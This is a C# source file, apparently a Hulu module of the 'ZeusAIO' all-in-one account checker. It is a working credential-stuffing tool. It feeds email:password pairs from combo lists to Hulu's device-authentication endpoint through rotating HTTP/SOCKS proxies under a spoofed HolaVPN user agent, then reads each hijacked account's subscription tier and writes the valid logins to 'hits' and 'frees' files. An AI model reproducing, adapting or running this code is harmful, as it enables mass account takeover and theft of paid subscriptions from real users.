using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Hulu
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string str = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=" + s[1] + "&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=" + s[0];
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string text2 = httpRequest.Post("https://auth.hulu.com/v1/device/password/authenticate", str, "application/x-www-form-urlencoded").ToString();
                            bool flag7 = text2.Contains("user_token");
                            bool flag8 = text2.Contains("Your login is invalid");

                            if (flag8)
                            {
                                break;
                            }
                            else if (flag7)
                            {
                                string Token = Check.Parse(text2, "user_token\":\"", "\",\"");
                                httpRequest.AddHeader("Authorization", "Bearer " + Token);
                                string text3 = httpRequest.Get("https://home.hulu.com/v1/users/self", null).ToString();
                                bool flag10= text3.Contains("262144"); //free
                                if (flag10)
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui== "2")
                                    {
                                        Console.WriteLine("[FREE - HULU] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Hulu_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else if (text3.Contains("66536")) 
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " | Hulu with ads", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " | Hulu with ads");
                                    return false;
                                }
                                else if (text3.Contains("197608"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " | Hulu (No Ads)", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " | Hulu (No Ads)");
                                    return false;
                                }
                                else if (text3.Contains("459752"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " | Hulu (No Ads) + Showtime", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " | Hulu (No Ads) + Showtime");
                                    return false;
                                }
                                else if (text3.Contains("1311769576"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu (No Ads) + Live TV, Enhanced Cloud DVR + Unlimited Screens Bundle, STARZÂ®");
                                    return false;
                                }
                                else if (text3.Contains("1049576"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu + Live TV + HBO + CINEMAX", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu + Live TV + HBO + CINEMAX");
                                    return false;
                                }
                                else if (text3.Contains("200356"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu (No Ads) Free Trial", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu (No Ads) Free Trial");
                                    return false;
                                }
                                else if (text3.Contains("70125"))
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - HULU] " + s[0] + ":" + s[1] + " |  Hulu + CINEMAXÂ®", Color.Green);
                                    }
                                    Export.AsResult("/Hulu_hits", s[0] + ":" + s[1] + " |  Hulu + CINEMAXÂ®");
                                    return false;
                                }
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }
                        }
                        break;
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}